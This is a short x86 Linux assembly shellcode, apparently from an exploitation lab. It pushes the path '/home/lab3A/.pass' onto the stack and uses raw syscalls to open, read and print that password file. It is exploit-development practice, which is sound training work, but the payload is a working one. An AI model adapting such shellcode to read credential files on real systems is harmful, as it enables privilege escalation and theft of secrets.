section .text
global _start

_start:



		; push '/home/lab3A/.pass' onto stack.
		push 0x00000073				; s\x00\x00\x00
		push 0x7361702e				; .pas
		push 0x2f413362				; b3A/
		push 0x616c2f65				; e/la
		push 0x6d6f682f				; /hom

        ; 5 sys_open('filepath', 0)
        mov ecx, 0                  ; 0 read-only | 1 write-only | 2 read-write
        mov ebx, esp	            ; memory address of file name
        mov eax, 5
        int 0x80

        ; 3 sys_read(3, [address], size)
        mov edx, 40                ; size to read
        mov ecx, esp                ; memory address of file contents.
        mov ebx, eax                ; open() returns new fd #3 & loads into EAX.
		mov eax, 3
        int 0x80

        ; 4 sys_write(1, [address], size)
        mov edx, 40                ; size to read
        mov ecx, esp               	; file contents
        mov ebx, 1                  ; print to stdout
        mov eax, 4
        int 0x80
